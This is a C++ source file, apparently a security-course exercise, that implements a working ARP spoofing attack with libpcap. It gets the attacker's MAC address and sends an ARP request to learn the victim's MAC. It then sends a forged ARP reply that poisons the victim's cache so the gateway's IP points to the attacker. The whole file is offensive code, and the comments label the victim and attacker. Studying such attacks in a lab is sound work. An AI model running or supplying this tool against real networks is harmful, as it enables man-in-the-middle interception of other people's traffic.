#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <stdlib.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <victim ip> <gateway ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

char* get_mac_address(char *dev);
int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char* victim_IP = argv[2];
    char* gateway_IP = argv[3];
    char victim_MAC[18] = {0, };
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // 1. Get attacker's MAC address
    char *attacker_MAC = get_mac_address(dev);
    if (attacker_MAC == NULL) {
        fprintf(stderr, "couldn't get MAC address\n");
        return -1;
    }
    printf("[*] attacker_MAC: %s\n", attacker_MAC);

    // 2. Find victim's MAC address 
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");	// victim's MAC
    packet.eth_.smac_ = Mac(attacker_MAC);			// attacker's MAC
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(attacker_MAC); 			// attacker's MAC 
    packet.arp_.sip_ = htonl(Ip(gateway_IP));       // gateway IP
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); 	// victim's MAC
    packet.arp_.tip_ = htonl(Ip(victim_IP)); 		// victim's IP
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }
    
    while (true)
    {
        struct pcap_pkthdr* header;
        const u_char* p;
        int res = pcap_next_ex(handle, &header, &p);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            pcap_close(handle);
            return -1;
        }

        struct EthHdr *eth_hdr = (struct EthHdr *)p;
        if (ntohs(eth_hdr->type_) == EthHdr::Arp) {
            struct ArpHdr* arp_hdr = (struct ArpHdr *)(p + sizeof(struct EthHdr));
            if (Mac(attacker_MAC) == arp_hdr->tmac_)
            { 
                if (ntohs(arp_hdr->op_) == ArpHdr::Reply) {
                    sprintf(victim_MAC, "%02x", ((uint8_t*)arp_hdr->smac_)[0]);
                    for(int i=0; i<5; i++)
                        sprintf((victim_MAC+2)+3*i, ":%02x", ((uint8_t*)arp_hdr->smac_)[i+1]);
                    break;
                }
            }
        }
    }

    // 3. DOOO ARP SPOOOOOOOFING 
    packet.eth_.dmac_ = Mac(victim_MAC);			// victim's MAC
    packet.eth_.smac_ = Mac(attacker_MAC);			// attacker's MAC
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(attacker_MAC); 			// attacker's MAC 
    packet.arp_.sip_ = htonl(Ip(gateway_IP)); 		// gateway IP
    packet.arp_.tmac_ = Mac(victim_MAC); 			// victim's MAC
    packet.arp_.tip_ = htonl(Ip(victim_IP)); 		// victim's IP
    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }


    pcap_close(handle);
}


char* get_mac_address(char *dev) {
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(s.ifr_name, dev);

    char *v_mac = (char *)malloc(18);
    if(v_mac == NULL)
        return 0;

    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        int i;
        sprintf(v_mac, "%02x", (unsigned char) s.ifr_addr.sa_data[0]);
        for (i = 0; i < 5; ++i)
            sprintf((v_mac+2) + 3*i,":%02x", (unsigned char) s.ifr_addr.sa_data[i+1]);

        printf("[*] %s\n", v_mac);
        close(fd);
        return v_mac;
    }

    return 0;
}
